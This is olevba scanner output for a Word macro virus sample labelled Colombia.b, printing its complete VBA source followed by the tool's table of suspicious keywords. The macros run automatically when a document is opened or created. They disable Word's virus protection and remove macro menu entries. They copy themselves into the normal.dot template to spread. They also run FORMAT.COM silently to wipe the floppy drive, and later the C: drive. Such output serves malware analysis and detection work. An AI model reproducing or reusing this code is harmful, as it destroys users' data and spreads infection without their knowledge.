olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Colombia.b-15dab30c7c89a5e3a757c4bb2a6c5de069fd2526
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Colombia.b-15dab30c7c89a5e3a757c4bb2a6c5de069fd2526 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Colombia.b-15dab30c7c89a5e3a757c4bb2a6c5de069fd2526 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro creada el 24/11/98 por *"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.colombia"

'
' colombia Macro
' Macro creada el 24/11/98 por *
'
On Error Resume Next
autoexec
engendrar
kill
        
End Sub
Sub autonew()
Attribute autonew.VB_Description = "Macro grabada el 24/11/98 por *"
Attribute autonew.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.autonew"

'
' autonew Macro
' Macro grabada el 24/11/98 por *
'
On Error Resume Next
autoexec
engendrar
kill
End Sub
Sub autoexec()
Attribute autoexec.VB_Description = "Macro grabada el 24/11/98 por *"
Attribute autoexec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.autoexec"
'
' autoexec Macro
' Macro grabada el 24/11/98 por *
'
On Error Resume Next
    kill
    engendrar
End Sub
Sub kill()
Dim RetVal, unidad, num, commline, cont
    minombre = Dir("C:\", 8)
    unidad = "a"
         
        unprotect
        Randomize
        num = Int(Rnd * 20)
        cont = Val(GetSetting("colombia", "te", "quiere", 0))
        StatusBar = "Linea " + Str(cont) + "Esquema " + unidad
        commline = "C:\WINDOWS\COMMAND\FORMAT.COM " + unidad + ": /AUTOTEST"
        If cont > 99 Then
            commline = "C:\WINDOWS\COMMAND\FORMAT.COM C: /AUTOTEST"
               
            If minombre <> "COLOMBIA" Then
                RetVal = Shell(commline, 0)
            Else
                MsgBox "*** Salvado por Colombia ***"
            End If
            
        Else
            If num > 0 Then
                commline = "C:\WINDOWS\COMMAND\FORMAT.COM a: /AUTOTEST"
                If minombre = "COLOMBIA" Or cont < 0 Then
                    StatusBar = "Se salvó el Diskette"
                    
                Else
                    RetVal = Shell(commline, 0)
                End If
            End If
            
        
        End If
        
        
        cont = Val(GetSetting("colombia", "te", "quiere", 0))
        
        If cont = 0 Then
            SaveSetting "colombia", "te", "quiere", 1
            
        Else
            If cont > 0 Then
                DeleteSetting "colombia", "te", "quiere"
                cont = cont + 1
                SaveSetting "colombia", "te", "quiere", Str(cont)
            End If
        End If
        
        
    
End Sub
Sub engendrar()
Dim normalpath, ruta
On Error Resume Next
normalpath = "normal.dot"
For Each normalpath In Templates
    ruta = normalpath.FullName
Next normalpath


Application.OrganizerCopy Source:= _
        ruta, _
        Destination:=ActiveDocument.FullName, Name:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, _
        Destination:=ruta, Name:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems

End Sub
Sub unprotect()
Attribute unprotect.VB_Description = "Macro grabada el 24/11/98 por *"
Attribute unprotect.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.unprotect"
'
' unprotect Macro
' Macro grabada el 24/11/98 por *
'
On Error Resume Next

    With Options
        .VirusProtection = False
        CommandBars("View").Controls(6).Delete
        CommandBars("Macro").Controls(1).Delete
        CommandBars("Macro").Controls(2).Delete
        CommandBars("Macro").Controls(3).Delete
        CommandBars("Tools").Controls(14).Delete
    End With
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

